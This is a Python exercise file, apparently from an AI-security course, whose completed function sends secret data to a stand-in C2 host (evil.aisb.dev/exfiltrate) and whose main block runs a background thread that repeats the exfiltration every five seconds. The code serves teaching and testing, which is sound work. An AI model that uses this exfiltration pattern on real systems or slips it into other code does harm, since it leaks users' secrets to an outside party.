# %%
import os

pass  # Ignore this line

import base64
import time
from typing import Any, Dict, Optional
from unittest.mock import MagicMock, patch

import requests
import requests.exceptions


def make_evil_request(secret_data: str) -> Optional[str]:
    """
    Send a GET request to evil.aisb.dev with secret data.

    This simulates an AI agent attempting to communicate with an external C2 server.
    The secret data is sent as a query parameter.

    Args:
        secret_data: The secret information to exfiltrate

    Returns:
        The response text from the server, or None if the request fails or throws
    """
    # TODO: Implement the function to:
    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
    try:
        resp = requests.get(
            "http://evil.aisb.dev/exfiltrate",
            params={"data": secret_data},
            timeout=5,
        )
        #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
        #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
        #   2. Return the response text if successful (status 200), None otherwise
        if resp.status_code == 200:
            return resp.text
    except requests.exceptions.RequestException:
        return None


from w1d2_test import test_make_evil_request

test_make_evil_request(make_evil_request)

exfiltrate_data = make_evil_request

if __name__ == "__main__":  # Only executed when running the script directly
    """
    Make requests to the evil server with different secret data.
    This simulates an AI agent repeatedly trying to exfiltrate data.
    """

    def loop_exfiltration():
        while True:
            global exfiltrate_data
            try:
                time.sleep(5)
                print(exfiltrate_data("some_secret_data"))
            except KeyboardInterrupt:
                print("Stopping exfiltration loop.")
                break

    import threading

    thread = threading.Thread(target=loop_exfiltration)
    thread.start()
